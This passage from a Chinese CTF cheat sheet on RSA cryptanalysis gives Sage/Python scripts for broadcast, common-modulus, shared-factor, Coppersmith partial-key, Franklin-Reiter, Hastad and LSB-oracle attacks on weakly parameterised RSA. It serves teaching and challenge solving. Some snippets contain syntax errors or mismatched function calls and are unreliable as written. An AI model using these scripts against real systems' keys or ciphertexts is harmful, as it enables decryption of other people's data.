\u89c6\u4e3a\u4e00\u4e2a\u6574\u4f53 $$M$$\uff0c\u8fd9\u5c31\u662f\u5178\u578b\u7684 \u4e2d\u56fd\u5269\u4f59\u5b9a\u7406 \u9002\u7528\u60c5\u51b5\u3002\u5bb9\u6613\u6c42\u5f97 $$m^e$$ \u7684\u503c\uff0c\u5f53 $$e$$ \u8f83\u5c0f\u65f6\u76f4\u63a5\u5f00 $$e$$ \u65b9\u5373\u53ef\uff0c\u53ef\u4f7f\u7528 gmpy2.iroot(M,e) \u65b9\u6cd5\u3002 \u66f4\u4e00\u822c\u60c5\u51b5\uff08$$k$$ \u7ec4\u6570\u636e\u7684 $$N$$ \u4e0d\u540c\uff09\u89c115\u3002 #sage def chinese_remainder(modulus, remainders): Sum = 0 prod = reduce(lambda a, b: a*b, modulus) for m_i, r_i in zip(modulus, remainders): p = prod // m_i Sum += r_i * (inverse_mod(p,m_i)*p) return Sum % prod chinese_remainder([3,5,7],[2,3,2]) #23 #sage crt([2,3,2],[3,5,7]) \u200b \u5171\u6a21\u653b\u51fb\uff08n,m\u76f8\u540c\uff0cc,e\u4e0d\u540c\uff09 \u5f53$$n$$\u4e0d\u53d8\u7684\u60c5\u51b5\u4e0b\uff0c\u77e5\u9053$$n,e_1,e_2,c_1,c_2$$\u53ef\u4ee5\u5728\u4e0d\u77e5\u9053$$d_1,d_2$$\u7684\u60c5\u51b5\u4e0b\uff0c\u89e3\u51fa$$m$$\u3002 \u9996\u5148\u5047\u8bbe$$e_1,e_2$$\u4e92\u8d28, \u5373 $$\\gcd(e_1,e_2)=1$$ \u6b64\u65f6\u5219\u6709 $$e_1s_1+e_2s_2 = 1$$ \u5f0f\u4e2d\uff0c$$s_1,s_2$$\u7686\u4e3a\u6574\u6570\uff0c\u4f46\u662f\u4e00\u6b63\u4e00\u8d1f\u3002 \u901a\u8fc7\u6269\u5c55\u6b27\u51e0\u91cc\u5fb7\u7b97\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8be5\u5f0f\u5b50\u7684\u4e00\u7ec4\u89e3$$\uff08s_1,s_2\uff09$$\uff0c\u5047\u8bbe$$s_1$$\u4e3a\u6b63\u6570,$$s_2$$\u4e3a\u8d1f\u6570\u3002 \u56e0\u4e3a $$c_1 = m^{e_1}\\bmod n, c_2 = m^{e_2}\\bmod n$$ \u6240\u4ee5 $$(c_1^{s_1}c_2^{s_2})\\bmod n = ((m^{e_1}\\bmod n)^{s_1}(m^{e_2}\\bmod n)^{s_2})\\bmod n$$ \u6839\u636e\u6a21\u8fd0\u7b97\u6027\u8d28\uff0c\u53ef\u4ee5\u5316\u7b80\u4e3a $$(c_1^{s_1}c_2^{s_2})\\bmod n = ((m^{e_1})^{s_1}(m^{e_2})^{s_2})\\bmod n$$ \u5373 $$(c_1^{s_1}c_2^{s_2})\\bmod n = (m^{e_1s_1+e_2s_2})\\bmod n$$ \u53c8\u524d\u9762\u63d0\u5230 $$e_1s_1+e_2s_2 = 1$$ \u6240\u4ee5 $$(c_1^{s_1}c_2^{s_2})\\bmod n = m\\bmod n$$ \u5373 $$c_1^{s_1}c_2^{s_2}= m$$ import gmpy2 as gp def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) n = c1 = c2 = e1 = e2 = s = egcd(e1, e2) s1 = s[1] s2 = s[2] if s1<0: s1 = - s1 c1 = gp.invert(c1, n) elif s2<0: s2 = - s2 c2 = gp.invert(c2, n) m = pow(c1,s1,n)*pow(c2,s2,n) % n print(hex(m)[2:]) print(bytes.fromhex(hex(m)[2:])) \u200b e,m\u76f8\u540c\uff0c\u591a\u4e2an\u4e2d\u5b58\u5728\u4e24\u4e2an\u6709GCD\uff08\u6a21\u4e0d\u4e92\u7d20\uff09 \u9002\u7528\u60c5\u51b5\uff1a\u5b58\u5728\u4e24\u4e2a\u6216\u66f4\u591a\u6a21\u6570 \uff0c\u4e14 $$\\gcd(n_1,n_2)\\ne 1$$ \u3002 \u591a\u4e2a\u6a21\u6570 $$n$$ \u5171\u7528\u8d28\u6570\uff0c\u5219\u53ef\u4ee5\u5f88\u5bb9\u6613\u5229\u7528\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u6c42\u5f97\u4ed6\u4eec\u7684\u8d28\u56e0\u6570\u4e4b\u4e00 $$\\gcd(n_1,n_2)$$\uff0c\u7136\u540e\u8fd9\u4e2a\u6700\u5927\u516c\u7ea6\u6570\u53ef\u7528\u4e8e\u5206\u89e3\u6a21\u6570\u5206\u522b\u5f97\u5230\u5bf9\u5e94\u7684 $$p$$ \u548c $$q$$\uff0c\u5373\u53ef\u8fdb\u884c\u89e3\u5bc6\u3002 import gmpy2 as gp n=[] for i in n: for j in n: if (i<>j): pub_p=gp.gcdext(i,j) if (pub_p[0]<>1)&(i>j): print(i) print(j) print(pub_p[0]) a=i,p=pub_p[0] q=a//p p = q = e = c = n = p*q phi = (p-1) * (q-1) d = gp.invert(e, phi) m = pow(c, d, n) print(hex(m)[2:]) print(bytes.fromhex(hex(m)[2:])) \u200b Rabin\u52a0\u5bc6 \u9002\u7528\u60c5\u51b5\uff1a$$e=2$$ \u3002 \u4e00\u822c\u5148\u901a\u8fc7\u5176\u4ed6\u65b9\u6cd5\u5206\u89e3\u5f97\u5230 $$p,q$$\uff0c\u7136\u540e\u89e3\u5bc6\u3002 \u51fd\u6570\u8fd4\u56de\u56db\u4e2a\u6570\uff0c\u8fd9\u5176\u4e2d\u53ea\u6709\u4e00\u4e2a\u662f\u6211\u4eec\u60f3\u8981\u7684\u660e\u6587\uff0c\u9700\u8981\u901a\u8fc7\u5176\u4ed6\u65b9\u5f0f\u9a8c\u8bc1\u3002 import gmpy2 def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) // 4, p) mq = pow(c, (q + 1) // 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) c = p = q = m = rabin_decrypt(c,p,q) for i in range(4): try: print(bytes.fromhex(hex(m[i])[2:])) except: pass \u200b Boneh and Durfee attack $$e$$ \u975e\u5e38\u5927\u63a5\u8fd1\u4e8e$$N$$\uff0c\u5373 $$d$$ \u8f83\u5c0f\u65f6\u3002\u4e0e\u4f4e\u89e3\u5bc6\u6307\u6570\u653b\u51fb\u7c7b\u4f3c\uff0c\u6bd4\u4f4e\u89e3\u5bc6\u6307\u6570\u653b\u51fb\uff08Wiener Attack\uff09\u66f4\u5f3a\uff0c\u53ef\u4ee5\u89e3\u51b3$$\\cfrac{1}{3}N^{\\frac{1}{4}} \\leq d \\leq N^{0.292}$$\u7684\u95ee\u9898\u3002 \u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002 2k [(N + 1)/2 + (-p -q)/2] + 1 = 0 mod e Boneh and Durfee attack: f(x,y) = 1 + x * (A + y) e d = x [(N + 1)/2 + y] + 1 \u6545\uff1a x = 2k y = (-p-q)/2 \u53d8\u79cd1 \uff1a$$e$$ \u5f88\u5927\uff0c$$dp$$ \u5f88\u5c0f\uff0c\u4e14 $$d>2N^{\\beta}$$\u3002 May\u2019s Attack \u5047\u8bbe $$e<\\varphi(N),q \\le N^{\\beta},\\beta \\le \\frac{1}{2}$$\uff0c\u56e0 $$ed_p \\equiv 1 \\pmod {p-1}$$\uff0c\u6709 $$ed_p=1+k(p-1)$$\uff0c \u5bf9\u4e8e $$k \\in \\mathbb{N}$$\uff0c\u6709 $$ed_p=(k-1)(p-1)+p$$\uff0c\u5373 $$ed_pq=(k-1)(N-q)+N$$\u3002 \u8bbe $$x,y$$ \u4e3a\u53c2\u6570\uff0c\u5219\u591a\u9879\u5f0f $$f(x,y)=x(N-y)+N$$ \u5728\u6a21 $$e$$ \u4e0b\u5b58\u5728\u6839 $$(x_0,y_0)=(k-1,q)$$\uff0c\u7528coppersmith attack\u53ef\u89e3\u3002 \u200b Coppersmith\u5b9a\u7406\u6307\u51fa\u5728\u4e00\u4e2a $$e$$ \u9636\u7684 $$\\bmod n$$ \u591a\u9879\u5f0f $$f(x)$$ \u4e2d\uff0c\u5982\u679c\u6709\u4e00\u4e2a\u6839\u5c0f\u4e8e $$n^{\\frac{1}{e}}$$\uff0c\u5c31\u53ef\u4ee5\u8fd0\u7528\u4e00\u4e2a $$O(\\log n)$$ \u7684\u7b97\u6cd5\u6c42\u51fa\u8fd9\u4e9b\u6839\u3002 Coppersmith\u653b\u51fb\uff08\u5df2\u77e5p\u7684\u9ad8\u4f4d\u653b\u51fb\uff09 \u77e5\u9053 $$p$$ \u7684\u9ad8\u4f4d\u4e3a $$p$$ \u7684\u4f4d\u6570\u7684\u7ea6$$\\frac12$$\u65f6\u5373\u53ef\u3002 #Sage from sage.all import * n = p4 = #p\u53bb0\u7684\u5269\u4f59\u4f4d e = pbits = 1024 kbits = pbits - p4.nbits() print(p4.nbits()) p4 = p4 << kbits PR.<x> = PolynomialRing(Zmod(n)) f = x + p4 roots = f.small_roots(X=2^kbits, beta=0.4) #\u7ecf\u8fc7\u4ee5\u4e0a\u4e00\u4e9b\u51fd\u6570\u5904\u7406\u540e\uff0cn\u548cp\u5df2\u7ecf\u88ab\u8f6c\u5316\u4e3a10\u8fdb\u5236 if roots: p = p4+int(roots[0]) print(\"n: \"+str(n)) print(\"p: \"+str(p)) print(\"q: \"+str(n//p)) \u200b Coppersmith\u653b\u51fb\uff08\u5df2\u77e5m\u7684\u9ad8\u4f4d\u653b\u51fb\uff09 \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u9996\u5148\u52a0\u5bc6\u4e86\u6d88\u606f $$m$$\uff0c\u5982\u4e0b $$C\\equiv m^e \\bmod N$$ \u5e76\u4e14\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u77e5\u9053\u6d88\u606f $$m$$ \u7684\u5f88\u5927\u7684\u4e00\u90e8\u5206 $$m_0$$\uff0c\u5373 $$m=m_0+x$$\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053 $$x$$\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u8be5\u65b9\u6cd5\u8fdb\u884c\u6062\u590d\u6d88\u606f\u3002\u8fd9\u91cc\u6211\u4eec\u4e0d\u77e5\u9053\u7684 $$x$$ \u5176\u5b9e\u5c31\u662f\u591a\u9879\u5f0f\u7684\u6839\uff0c\u9700\u8981\u6ee1\u8db3 Coppersmith \u7684\u7ea6\u675f\u3002 \u53ef\u4ee5\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002 $$e$$ \u8db3\u591f\u5c0f\uff0c\u4e14\u90e8\u5206\u660e\u6587\u6cc4\u9732\u65f6\uff0c\u53ef\u4ee5\u91c7\u7528Coppersmith\u5355\u53d8\u91cf\u6a21\u7b49\u5f0f\u7684\u653b\u51fb\uff0c\u5982\u4e0b\uff1a $$c=m^{e}\\bmod n=(mbar+x_{0})^{e}\\bmod n$$\uff0c\u5176\u4e2d $$mbar = (m >> k\\text{bits}) << k\\text{bits}$$ \u5f53 $$\\vert x_{0}\\vert\\leq N^{\\frac{1}{e}}$$ \u65f6\uff0c\u53ef\u4ee5\u5728 $$\\log N$$ \u548c $$e$$ \u7684\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u6c42\u51fa $$x_0$$\u3002 #Sage n = e = c = mbar = kbits = beta = 1 nbits = n.nbits() print(\"upper {} bits of {} bits is given\".format(nbits - kbits, nbits)) PR.<x> = PolynomialRing(Zmod(n)) f = (mbar + x)^e - c x0 = f.small_roots(X=2^kbits, beta=1)[0] # find root < 2^kbits with factor = n print(\"m:\", mbar + x0) \u200b Coppersmith\u653b\u51fb\uff08\u5df2\u77e5d\u7684\u4f4e\u4f4d\u653b\u51fb\uff09 \u5982\u679c\u77e5\u9053 $$d$$ \u7684\u4f4e\u4f4d\uff0c\u4f4e\u4f4d\u7ea6\u4e3a $$n$$ \u7684\u4f4d\u6570\u7684 $$\\frac14$$ \uff08$$\\frac{n.n\\text{bits}()}{4}$$\uff09\u5c31\u53ef\u4ee5\u6062\u590d $$d$$\u3002 #Sage def partial_p(p0, kbits, n): PR.<x> = PolynomialRing(Zmod(n)) nbits = n.nbits() f = 2^kbits*x + p0 f = f.monic() roots = f.small_roots(X=2^(nbits//2-kbits), beta=0.4) # find root < 2^(nbits//2-kbits) with factor >= n^0.4 if roots: x0 = roots[0] p = gcd(2^kbits*x0 + p0, n) return ZZ(p) def find_p(d0, kbits, e, n): X = var('X') for k in range(1, e+1): results = solve_mod([e*d0*X - k*X*(n-X+1) + k*n == X], 2^kbits) for x in results: p0 = ZZ(x[0]) p = partial_p(p0, kbits, n) if p and p != 1: return p if __name__ == '__main__': n = e = c = d0 = beta = 0.5 nbits = n.nbits() kbits = d0.nbits() print(\"lower %d bits (of %d bits) is given\" % (kbits, nbits)) p = int(find_p(d0, kbits, e, n)) print(\"found p: %d\" % p) q = n//int(p) print(\"d:\", inverse_mod(e, (p-1)*(q-1))) \u53d8\u79cd1 \uff1a$$n=p\\cdot q\\cdot r$$\uff0c\u5df2\u77e5 $$n,p,d=\\text{inv}(e,\\varphi(n)),e,c$$ $$k(p-1)\\rightarrow k\u2019,qr\\rightarrow n\u2019,q+r\\rightarrow s$$ $$ed_{0}\\equiv 1+k\u2019(n\u2019-s+1) \\pmod {2^{d_{0}.n\\text{bits}()}}\\quad (1)$$ $$q^{2}-sq+n\u2019\\equiv 0 \\pmod {2^{d_{0}.n\\text{bits}()}}\\quad (2)$$ \u8054\u7acb\u53ef\u5f97\uff0c$$(ed_{0}-1-k\u2019n\u2019-k\u2019)q+k\u2019q^{2}+k\u2019n\u2019\\equiv 0 \\pmod {2^{d_{0}.n\\text{bits}()}}$$ \u5373\u6c42\u89e3\u540c\u4f59\u65b9\u7a0b\u53ef\u5f97 $$q$$ \u7684\u4f4e $$size(d0)$$ \u4f4d\uff0c\u672c\u6765\u662f\u4e2apartial d\u7684coppersmith\u95ee\u9898\uff0c\u4f46\u56e0\u4e3astep1\u6c42\u89e3\u540c\u4f59\u65b9\u7a0b\u540e\u5f97\u5230\u7684 $$q$$ \u5df2\u662f\u5b8c\u6574\u7684 $$q$$\uff0c\u6240\u4ee5\u65e0\u9700\u540e\u7eed\u7684coppersmith\u3002 \u53c2\u8003\uff1a Dragon CTF 2019 - RSA Chained #Sage def find_p(d0, kbits, e, n, p): X = var('X') for k in range(1, e + 1): k_dot = k * (p - 1) results = solve_mod([e * d0 * X - k_dot * X * (n - X + 1) + k_dot * n == X], 2^kbits) for x in results: q = ZZ(x[0]) if n % q == 0: return q return None n = ... # q * r p = c = d0 = e = kbits = d0.nbits() q = find_p(d0, kbits, e, n, p) phi = (p - 1) * (q - 1) * (n // q - 1) d = inverse_mod(e, phi) print(bytes.fromhex(hex(pow(c, d, p * n))[2:])) \u200b Coppersmith\u653b\u51fb\uff08\u5df2\u77e5N\u4e00\u4e2a\u56e0\u5b50\u7684\u9ad8\u4f4d\uff0c\u90e8\u5206p\uff09 \u5f53\u6211\u4eec\u77e5\u9053\u4e00\u4e2a\u516c\u94a5\u4e2d\u6a21\u6570 $$N$$ \u7684\u4e00\u4e2a\u56e0\u5b50\u7684\u8f83\u9ad8\u4f4d\u65f6\uff0c\u6211\u4eec\u5c31\u6709\u4e00\u5b9a\u51e0\u7387\u6765\u5206\u89e3 $$N$$\u3002 \u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002 \u5173\u6ce8\u4e0b\u9762\u7684\u4ee3\u7801\uff1a beta = 0.5 dd = f.degree() epsilon = beta / 7 mm = ceil(beta**2 / (dd * epsilon)) tt = floor(dd * mm * ((1/beta) - 1)) XX = ceil(N**((beta**2/dd) - epsilon)) + 1000000000000000000000000000000000 roots = coppersmith_howgrave_univariate(f, N, beta, mm, tt, XX) \u5176\u4e2d\uff0c \u5fc5\u987b\u6ee1\u8db3 $$q\\ge N^{beta}$$\uff0c\u6240\u4ee5\u8fd9\u91cc\u7ed9\u51fa\u4e86 $$beta=0.5$$\uff0c\u663e\u7136\u4e24\u4e2a\u56e0\u6570\u4e2d\u5fc5\u7136\u6709\u4e00\u4e2a\u662f\u5927\u4e8e\u7684\u3002 XX \u662f $$f(x)=q\u2032+x$$ \u5728\u6a21 $$q$$ \u610f\u4e49\u4e0b\u7684\u6839\u7684\u4e0a\u754c\uff0c\u81ea\u7136\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u8c03\u6574\u5b83\uff0c\u8fd9\u91cc\u5176\u5b9e\u4e5f\u8868\u660e\u4e86\u6211\u4eec\u5df2\u77e5\u7684 $$q\u2032$$ \u4e0e\u56e0\u6570 $$q$$ \u4e4b\u95f4\u53ef\u80fd\u7684\u5dee\u8ddd\u3002 #Sage n = e = c = pbar = kbits = print(\"upper %d bits (of %d bits) is given\" % (pbar.nbits()-kbits, pbar.nbits())) PR.<x> = PolynomialRing(Zmod(n)) f = x + pbar x0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root < 2^kbits with factor >= n^0.4 p = x0 + pbar print(\"p:\", p) q = n // int(p) d = inverse_mod(e, (p-1)*(q-1)) print(\"m:\", pow(c, d, n)) \u6ce8\uff1a sage\u7684small_root\u4f20\u53c2 X \u4e0d\u80fd\u8fc7\u5927\uff0c\u9700\u81ea\u884c\u5224\u65ad\u9608\u503c\u5e76\u8c03\u6574\uff08\u5982\u679cX\u8fc7\u5927\uff0c\u5373\u4f7f\u5b58\u5728X\u5185\u7684\u89e3\uff0c\u4e5f\u65e0\u6cd5\u6c42\u51fa\uff09\uff1b \u6bd4\u5982 $$p$$ \u7684\u4f4e\u4f4d\u6cc4\u9732\u65f6\u56e0\u4e3a\u4e0d\u786e\u5b9a\u7f3a\u5931\u9ad8\u4f4d\u7684\u5177\u4f53\u6bd4\u7279\u6570\uff0c\u6240\u4ee5\u8981\u5728 $$2^{\\frac{n.n\\text{bits}()}{2}\u2212k\\text{bits}}$$ \u9644\u8fd1\u4f5cX\u7684\u9608\u503c\u4f30\u8ba1\uff1b \u65e0\u6cd5\u786e\u5b9a\u62ff\u5230\u7684 $$p$$ \u662f\u5426\u5927\u4e8e $$q$$\uff0c\u6240\u4ee5\u5bf9 $$\\beta=0.5$$ \u8fdb\u884c\u8c03\u6574\u81f3 $$0.4$$\u3002 \u200b Coppersmith\u2019s Short-pad Attack & Related Message Attack\uff08Franklin-Reiter\u653b\u51fb\uff09 \u76ee\u524d\u5728\u5927\u90e8\u5206\u6d88\u606f\u52a0\u5bc6\u4e4b\u524d\u90fd\u4f1a\u8fdb\u884c padding\uff0c\u4f46\u662f\u5982\u679c padding \u7684\u957f\u5ea6\u8fc7\u77ed\uff08$$m \\in (0,\\lfloor\\frac{n.n\\text{bits}()}{e^2}\\rfloor]$$\uff09\uff0c\u4e5f\u6709 \u53ef\u80fd \u88ab\u5f88\u5bb9\u6613\u5730\u653b\u51fb\u3002 \u8fd9\u91cc\u6240\u8c13 padding \u8fc7\u77ed\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9\u5e94\u7684\u591a\u9879\u5f0f\u7684\u6839\u4f1a\u8fc7\u5c0f\u3002 \u5f53 Alice \u4f7f\u7528\u540c\u4e00\u516c\u94a5\u5bf9\u4e24\u4e2a\u5177\u6709\u67d0\u79cd\u7ebf\u6027\u5173\u7cfb\u7684\u6d88\u606f $$M_1$$ \u4e0e $$M_2$$ \u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u540e\u7684\u6d88\u606f $$C_1$$\uff0c$$C_2$$ \u53d1\u9001\u7ed9\u4e86 Bob \u65f6\uff0c\u6211\u4eec\u5c31\u53ef\u80fd\u53ef\u4ee5\u83b7\u5f97\u5bf9\u5e94\u7684\u6d88\u606f $$M_1$$ \u4e0e $$M_2$$ \u3002\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6a21\u6570\u4e3a $$N$$\uff0c\u4e24\u8005\u4e4b\u95f4\u7684\u7ebf\u6027\u5173\u7cfb\u5982\u4e0b\uff1a $$M_1 \\equiv f(M_2) \\bmod N$$ \u5176\u4e2d $$f$$ \u4e3a\u4e00\u4e2a\u7ebf\u6027\u51fd\u6570\uff0c\u6bd4\u5982\u8bf4 $$f=ax+b$$\u3002 \u5728\u5177\u6709\u8f83\u5c0f\u9519\u8bef\u6982\u7387\u4e0b\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u590d\u6742\u5ea6\u4e3a $$O(e\\log^2N)$$\u3002 \u8fd9\u4e00\u653b\u51fb\u7531 Franklin\u4e0eReiter \u63d0\u51fa\u3002 #\u811a\u672c1 #Sage import binascii def attack(c1, c2, n, e): PR.<x>=PolynomialRing(Zmod(n)) # replace a,b,c,d g1 = (a*x+b)^e - c1 g2 = (c*x+d)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0] c1 = c2 = n = e = m1 = attack(c1, c2, n, e) print(binascii.unhexlify(\"%x\" % int(m1))) #\u811a\u672c2 #Sage def short_pad_attack(c1, c2, e, n): PRxy.<x,y> = PolynomialRing(Zmod(n)) PRx.<xn> = PolynomialRing(Zmod(n)) PRZZ.<xz,yz> = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() kbits = n.nbits()//(2*e*e) diff = h.small_roots(X=2^kbits, beta=0.4)[0] # find root < 2^kbits with factor >= n^0.4 return diff def related_message_attack(c1, c2, diff, e, n): PRx.<x> = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0] if __name__ == '__main__': n = e = c1 = c2 = diff = short_pad_attack(c1, c2, e, n) print(\"difference of two messages is %d\" % diff) m1 = related_message_attack(c1, c2, diff, e, n) print(\"m1:\", m1) print(\"m2:\", m1 + diff) \u200b RSA Hastad Attack with non-linear padding and different public keys\uff08\u5e26\u975e\u7ebf\u6027padding\u548c\u4e0d\u540c\u516c\u94a5\u7684\u5e7f\u64ad\u653b\u51fb\uff09 \u9002\u7528\u60c5\u51b5\uff1a$$m$$ \u7ecf $$k$$ \u6b21\u975e\u7ebf\u6027padding\u5904\u7406\u540e\uff0c\u5206\u522b\u7528 $$k$$ \u7ec4 $$(N_i,e_i)$$ \u52a0\u5bc6\u540e\u5f97 $$k$$ \u7ec4 $$c_i$$\u3002 \u53c2\u8003\uff1a2020\u5e74\u7f8a\u57ce\u676f - Invitation #Sage #e=3, padding: m\u00b2+(3^431)k def linearPaddingHastads(cArray,nArray,aArray,bArray,eArray,eps): if(len(cArray) == len(nArray) == len(aArray) == len(bArray) == len(eArray)): for i in range(4): cArray[i] = Integer(cArray[i]) nArray[i] = Integer(nArray[i]) aArray[i] = Integer(aArray[i]) bArray[i] = Integer(bArray[i]) eArray[i] = Integer(eArray[i]) TArray = [-1]*4 for i in range(4): arrayToCRT = [0]*4 arrayToCRT[i] = 1 TArray[i] = crt(arrayToCRT,nArray) P.<x> = PolynomialRing(Zmod(prod(nArray))) gArray = [-1]*4 for i in range(4): gArray[i] = TArray[i]*(pow(aArray[i]*x**2 + bArray[i],eArray[i]) - cArray[i]) g = sum(gArray) g = g.monic() roots = g.small_roots(epsilon=eps) if(len(roots)== 0): print(\"No Solutions found!\") return -1 return roots else: print(\"Input error!\") def nonLinearPadding(): eArr = [3 for i in range(4)] nArr = [146694460234280339612721415368435987068740712812770728817136582256341063038147863645902264969297892447333024201649306207442798919845916187823646745721109151386096190207317810424580842120750075213595282979568495342617919336417068886973047979116994072272482630372638964064972815256237040541007947708358680368391,65031485534704406281490718325237831433086480239135617407356760819741796565231283220528137697949585150709734732370203390254643835828984376427852793969716489016520923272675090536677771074867975287284694860155903327351119710765174437247599498342292671117884858621418276613385329637307269711179183430246951756029,126172075578367446151297289668746433680600889845504078949758568698284471307000358407453139846282095477016675769468273204536898117467559575203458221600341760844973676129445394999861380625435418853474246813202182316736885441120197888145039130477114127079444939102267586634051045795627433724810346460217871661901,75691424835079457343374072990750986689075078863640186724151061449621926239051140991748483370587430224317778303489124525034113533087612981452189061743589227565099659070008017454957304620495920813121234552401715857719372861565651204968408267740732475458128601061676264465241188491988485848198323410127587280471] cArr = [129274519334082165644106292383763271862424981496822335330342328217347928093592453953990448827969549377883054831490973006383371688359344675312001881631556371220779971357039899721241880304156884612458373310254854821837978876725801047977081900824202659636258168216028784656056334358157381820784576207338479493823,8140023566779187828652447593867705813386781164538611122714708931585587727699213769519135028841126072130625547328311301696554048174772606261707345115571968105138543476580875347239912760797035694220505996377127309341770427102697008350472060971360460756799310951343070384766137332401117333917901167639276168214,25434511525127530194830986592289179576070740435049947678930286998924519588985583799757299734846614343604661534391991096353170465467791358514448923161460366596251448937540153262731348684727026598527904328268639060306102090278287818149679940661579357649191023269947102746200467430583428889484549034314463114080,9435583236354598287661880148272717764447540972316605192855157484524753847806158586224733743434644389385148450722945845355791145016665856388503878165725148745517696840251674049929524448078129458846254866804153080766917319923905682824180976106679633180818527967145571143203594244851742143986040226240019541346] aArr = [1 for i in range(4)] bArr = [i * 3 ** 431 for i in [3,8,10,11]] msg = linearPaddingHastads(cArr,nArr,aArr,bArr,eArr,eps=1/20) for i in msg: print(bytes.fromhex(hex(i)[2:])) if __name__ == '__main__': nonLinearPadding() \u200b Least Significant Bit Oracle Attack \uff08LSB Oracle Attack / Parity Oracle\uff09 \u9002\u7528\u60c5\u51b5\uff1a\u53ef\u4ee5\u9009\u62e9\u5bc6\u6587\u5e76\u6cc4\u9732\u660e\u6587\u7684\u6700\u4f4e\u4f4d\uff08\u5947\u5076\u6027\uff09\u3002 \u5047\u8bbe\u5b58\u5728\u4e00\u4e2aoracle\uff0c\u80fd\u5bf9\u7ed9\u5b9a\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\u5e76\u7ed9\u51fa\u5bf9\u5e94\u660e\u6587\u7684\u5947\u5076\u4fe1\u606f\uff0c\u5219\u6211\u4eec\u53ea\u9700\u8981 $$\\log(N)$$ \u6b21\u5c31\u80fd\u89e3\u5bc6\u4efb\u610f\u5bc6\u6587\u3002 \u5728\u4e00\u6b21RSA\u52a0\u5bc6\u4e2d\uff0c\u660e\u6587\u4e3a $$m$$\uff0c\u6a21\u6570\u4e3a $$n$$\uff0c\u52a0\u5bc6\u6307\u6570\u4e3a $$e$$\uff0c\u5bc6\u6587\u4e3a $$c$$\u3002\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u51fa $$c\u2019=((2^e)\\cdot c)\\%n=((2^e)\\cdot(m^e))\\%n=((2\\cdot m)^e)\\%n$$ \uff0c \u56e0\u4e3a $$m$$ \u7684\u4e24\u500d\u53ef\u80fd\u5927\u4e8e $$n$$\uff0c\u6240\u4ee5\u7ecf\u8fc7\u89e3\u5bc6\u5f97\u5230\u7684\u660e\u6587\u662f $$m\u2019=(2\\cdot m)\\%n$$ \u3002 \u6211\u4eec\u8fd8\u80fd\u591f\u77e5\u9053 $$m\u2019$$ \u7684\u6700\u4f4e\u4f4d lsb \u662f1\u8fd8\u662f0\u3002 \u56e0\u4e3a $$n$$ \u662f\u5947\u6570\uff0c\u800c $$2\\cdot m$$ \u662f\u5076\u6570\uff0c\u6240\u4ee5\u5982\u679c lsb \u662f0\uff0c\u8bf4\u660e$$(2\\cdot m)\\%n$$ \u662f\u5076\u6570\uff0c\u6ca1\u6709\u8d85\u8fc7 $$n$$\uff0c\u5373 $$m\\lt \\cfrac{n}{2}$$ \uff0c\u53cd\u4e4b\u5219 $$m\\gt \\cfrac{n}{2}$$ \u3002\u4e3e\u4e2a\u4f8b\u5b50\u5c31\u80fd\u660e\u767d $$2\\%3=2$$ \u662f\u5076\u6570\uff0c\u800c$$4\\%3=1$$ \u662f\u5947\u6570\u3002\u4ee5\u6b64\u7c7b\u63a8\uff0c\u6784\u9020\u5bc6\u6587 $$c\u2019\u2019=((4^e)\\cdot c)\\%n$$ \u4f7f\u5176\u89e3\u5bc6\u540e\u4e3a $$m\u2019\u2019=(4\\cdot m)\\%n$$ \uff0c\u5224\u65ad \u7684\u5947\u5076\u6027\u53ef\u4ee5\u77e5\u9053 $$m\u2019\u2019$$ \u548c $$\\cfrac{n}{4}$$ \u7684\u5927\u5c0f\u5173\u7cfb\u3002\u6240\u4ee5\u6211\u4eec\u5c31\u6709\u4e86\u4e00\u4e2a\u4e8c\u5206\u7b97\u6cd5\uff0c\u53ef\u4ee5\u5728\u5bf9\u6570\u65f6\u95f4\u5185\u5c06 $$m$$ \u7684\u8303\u56f4\u903c\u8fd1\u5230\u4e00\u4e2a\u8db3\u591f\u72ed\u7a84\u7684\u7a7a\u95f4\u3002 \u66f4\u591a\u4fe1\u606f\u53ef\u53c2\u8003\uff1a RSA Least-Significant-Bit Oracle Attack \u548c RSA least significant bit oracle attack \u3002 import decimal def oracle(): return lsb == 'odd' def partial(c, e, n): k = n.bit_length() decimal.getcontext().prec = k # for 'precise enough' floats lo = decimal.Decimal(0) hi = decimal.Decimal(n) for i in range(k): if not oracle(c): hi = (lo + hi) / 2 else: lo = (lo + hi) / 2 c = (c * pow(2, e, n)) % n # print i, int(hi - lo) return int(hi) \u200b Common Private Exponent\uff08\u5171\u79c1\u94a5\u6307\u6570\u653b\u51fb\uff0cd\u76f8\u540c\uff09 